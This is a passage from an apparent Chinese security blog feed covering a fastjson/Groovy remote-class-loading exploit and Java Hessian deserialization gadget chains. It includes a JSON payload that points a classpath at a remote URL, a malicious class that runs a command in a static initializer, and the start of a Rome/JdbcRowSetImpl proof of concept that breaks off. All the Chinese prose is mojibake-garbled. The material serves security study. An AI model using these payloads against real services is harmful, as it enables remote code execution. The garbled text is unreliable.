class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>åˆ©ç”¨éšå¼ç±»å…³ç³»å°† org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnitã€ org.codehaus.groovy.control.CompilerConfigurationåŠ å…¥åˆ°mapingä¸­ <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;unit&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="number">2.</span>åˆ©ç”¨é“¾åŠ è½½è¿œç¨‹ç±» <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;classpath&quot;</span><span class="punctuation">:</span><span class="string">&quot;urlåœ°å€xxx&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>æœåŠ¡å™¨é…ç½®:<br> æ–°å»ºæ–‡ä»¶ META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation æ–‡ä»¶å†…å®¹ä¸ºMyExction<br> httpæ ¹ç›®å½•æ”¾ç½®MyExction.class</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ASTNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;</span><br><span class="line"><span class="meta">@GroovyASTTransformation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyExction</span> <span class="keyword">implements</span> <span class="title class_">ASTTransformation</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> &#123; <span class="keyword">try</span> &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var1);</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessianååºåˆ—åŒ–</title>
      <link href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Hessian-ååºåˆ—åŒ–"><a href="#Hessian-ååºåˆ—åŒ–" class="headerlink" title="Hessian ååºåˆ—åŒ–"></a>Hessian ååºåˆ—åŒ–</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>Remote Procedure Call Protocolï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨åè®®ï¼Œå’Œ RMIï¼ˆRemote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ç±»ä¼¼ï¼Œéƒ½èƒ½é€šè¿‡ç½‘ç»œè°ƒç”¨è¿œç¨‹æœåŠ¡ï¼Œä½† RPC æ˜¯ä»¥æ ‡å‡†çš„äºŒè¿›åˆ¶æ ¼å¼æ¥å®šä¹‰è¯·æ±‚çš„ä¿¡æ¯ï¼Œå¯ç”¨å®ç°è·¨è¯­è¨€å’Œè·¨æ“ä½œç³»ç»Ÿé€šè®¯ã€‚</p><p>é€šè®¯è¿‡ç¨‹ï¼š</p><p>1.å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¹¶æŒ‰ç…§ RPC åè®®æ ¼å¼å¡«å……ä¿¡æ¯<br>2.å¡«å……å®Œæ¯•åå°†äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶è½¬åŒ–ä¸ºæµï¼Œé€šè¿‡ä¼ è¾“åè®®è¿›è¡Œä¼ è¾“<br>3.æœåŠ¡ç«¯æ¥æ”¶åˆ°æµåï¼Œå°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§ RPC åè®®æ ¼å¼è·å–è¯·æ±‚ä¿¡æ¯å¹¶è¿›è¡Œå¤„ç†<br>4.å¤„ç†å®Œæ¯•åå°†ç»“æœæŒ‰ç…§ RPC åè®®æ ¼å¼å†™å…¥äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ä¸­å¹¶è¿”å›</p><p>maven æ·»åŠ æ‰©å±•ï¼š</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«"><a href="#Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«" class="headerlink" title="Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«"></a>Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«</h3><p>ç¤ºä¾‹ç±»</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Code</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;ttt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age=<span class="number">222</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span>&#123;</span><br><span class="line">        System.out.print(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>åŸç”Ÿåºåˆ—åŒ–ååºåˆ—åŒ–</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        oser.writeObject(<span class="keyword">new</span> <span class="title class_">Code</span>());</span><br><span class="line">        oser.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        ObjectInputStream unser=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        Object newobj=unser.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236138.png"                      alt="image-20230126221405110"                ><figcaption>image-20230126221405110</figcaption></figure></p><p>Hessianåºåˆ—åŒ–ååºåˆ—åŒ–</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hessianDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(ser);</span><br><span class="line">        hessianOutput.writeObject(<span class="keyword">new</span> <span class="title class_">Code</span>());</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line"></span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072235712.png"                      alt="image-20230126222015375"                ><figcaption>image-20230126222015375</figcaption></figure></p><blockquote><p>ä»è¿è¡Œç»“æœä¸­å¯ä»¥çœ‹å‡ºï¼Œ<code>Hessian</code>ååºåˆ—åŒ–ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ååºåˆ—åŒ–ç±»çš„<code>readObject</code>æ–¹æ³•ï¼Œè¿™ä¹Ÿå°±ç›´æ¥å¯¼è‡´JDKåŸç”Ÿååºåˆ—åŒ–çš„å¤§å¤šæ•°<code>gadget</code>åœ¨<code>Hessian</code>ååºåˆ—åŒ–ä¸­æ˜¯ä¸èƒ½ç”¨çš„ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åŒºåˆ«ï¼Œ<code>hessian</code>ååºåˆ—åŒ–ä¸­åºåˆ—åŒ–çš„ç±»ä¸éœ€è¦å®ç°åºåˆ—åŒ–æ¥å£ã€‚</p></blockquote><h3 id="Hessianååºåˆ—åŒ–æ¼æ´"><a href="#Hessianååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Hessianååºåˆ—åŒ–æ¼æ´"></a>Hessianååºåˆ—åŒ–æ¼æ´</h3><p>è™½ç„¶<code>Hessian</code>ååºåˆ—åŒ–ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ååºåˆ—åŒ–ç±»çš„<code>readObject</code>æ–¹æ³•ï¼Œä½†å…¶ä¹Ÿæœ‰è‡ªå·±çš„ç‰¹æ€§ï¼Œå½“å…¶ååºåˆ—åŒ–<code>Map</code>ç±»å‹çš„å¯¹è±¡çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å…¶<code>put</code>æ–¹æ³•ï¼Œå†™ä¸ªdemoè¯•è¯•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testMap</span> <span class="keyword">extends</span> <span class="title class_">HashMap</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç„¶åååºåˆ—åŒ–</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hessianDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        testMap tt=<span class="keyword">new</span> <span class="title class_">testMap</span>();</span><br><span class="line">        tt.put(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        ByteArrayOutputStream ser=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(ser);</span><br><span class="line">        hessianOutput.writeObject(tt);</span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072235097.png"                      alt="image-20230126224841023"                ><figcaption>image-20230126224841023</figcaption></figure></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®è°ƒç”¨äº†<code>put</code>æ–¹æ³•ï¼Œè¿™æ—¶çœ‹åˆ°<code>HashMap</code>çš„<code>put</code>æ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236935.png"                      alt="image-20230130233718255"                ><figcaption>image-20230130233718255</figcaption></figure></p><p>å¯¹<code>key</code>è°ƒç”¨<code>hash</code>æ–¹æ³•è¿›è¡Œå¤„ç†</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236365.png"                      alt="image-20230126225301457"                ><figcaption>image-20230126225301457</figcaption></figure></p><p>åªè¦<code>key</code>ä¸ä¸ºç©ºï¼Œå°±ä¼šè°ƒç”¨å…¶<code>hashCode</code>æ–¹æ³•ï¼Œæ€è·¯ä¸€ä¸‹å°±æ‰“å¼€äº†ï¼Œä¹‹å‰çœ‹è¿‡çš„åˆ©ç”¨é“¾ä¸­æœ‰éƒ¨åˆ†å°±ç”¨åˆ°äº†<code>hashCode</code>æ–¹æ³•ï¼Œæ¯”å¦‚<code>rome</code>ï¼Œåˆæ¯”å¦‚cc6ç­‰ã€‚</p><p>å°±å¦‚åŸç”ŸJDKæœ‰<code>ysoserial</code>ï¼Œ<code>Hessian</code>ä¹Ÿæœ‰å¯¹åº”çš„å·¥å…·ç”Ÿæˆ<code>paylaod</code>ã€‚<a class="link"   href="https://github.com/mbechler/marshalsec" >marshalsec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ä¸­å°±é›†æˆäº†<code>Hessian</code>ååºåˆ—åŒ–çš„<code>gadget</code>ï¼Œå¯ä»¥ä½¿ç”¨å…¶ç”Ÿæˆ<code>paylaod</code>ï¼Œè¯¥å·¥å…·ä¸­é›†æˆäº†5ä¸ª<code>gadget</code></p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringPartiallyComparableAdvisorHolder</li></ul><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="è§¦å‘ç‚¹"><a href="#è§¦å‘ç‚¹" class="headerlink" title="è§¦å‘ç‚¹"></a>è§¦å‘ç‚¹</h3><p>ç”±äº Hessian ä¼šåŠ ä½ ä¸ªåºåˆ—åŒ–çš„ç»“æœå¤„ç†æˆä¸€ä¸ª Mapï¼Œæ‰€æœ‰åºåˆ—åŒ–çš„ç»“æœçš„ bytes çš„ç¬¬ä¸€ä¸ª byte æ€»ä¸º Mï¼ˆ77ï¼‰,ä¼šè¿›å…¥è¿™ä¸ªcase</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> _serializerFactory.readMap(<span class="built_in">this</span>, type);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›readMap</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span></span><br><span class="line">    <span class="keyword">throws</span> HessianProtocolException, IOException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getDeserializer(type);</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›getDeserializerï¼Œåˆ›å»ºä¸€ä¸ª HashMap ä½œä¸ºç¼“å­˜ï¼Œå…ˆå°†è¦ååºåˆ—åŒ–çš„ç±»ä½œä¸º key æ”¾å…¥ HashMap ä¸­</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Deserializer <span class="title function_">getDeserializer</span><span class="params">(String type)</span></span><br><span class="line">  <span class="keyword">throws</span> HessianProtocolException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_cachedTypeDeserializerMap == <span class="literal">null</span>)</span><br><span class="line">      _cachedTypeDeserializerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;</span><br><span class="line">      _cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> deserializer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œä¼šè°ƒç”¨ HashMap.put æ–¹æ³•ï¼Œç»“åˆä¹‹å‰åˆ†æè¿‡çš„ CC é“¾ï¼Œåç»­è°ƒç”¨çš„ hash å‡½æ•°èƒ½è§¦å‘ä»»æ„ç±»çš„ hashcode æ–¹æ³•ã€‚é‚£ä¹ˆåªéœ€è¦æ‰¾ä¸€æ¡å…¥å£ä¸º hashcode çš„ååºåˆ—åŒ–é“¾å³å¯</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Rome</span><br><span class="line">XBean</span><br><span class="line">Resin</span><br><span class="line">SpringPartiallyComparableAdvisorHolder</span><br><span class="line">SpringAbstractBeanFactoryPointcutAdvisor</span><br></pre></td></tr></table></figure></div><h2 id="æ‰“Rome"><a href="#æ‰“Rome" class="headerlink" title="æ‰“Rome"></a>æ‰“Rome</h2><p>poc</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> moonflower.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.ObjectNameDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome</span> &#123;</span><br><span class="line"><span class="comment">//åŒ…è£…åºåˆ—åŒ–çš„å‡½æ•°</span></span><br><span class="line">    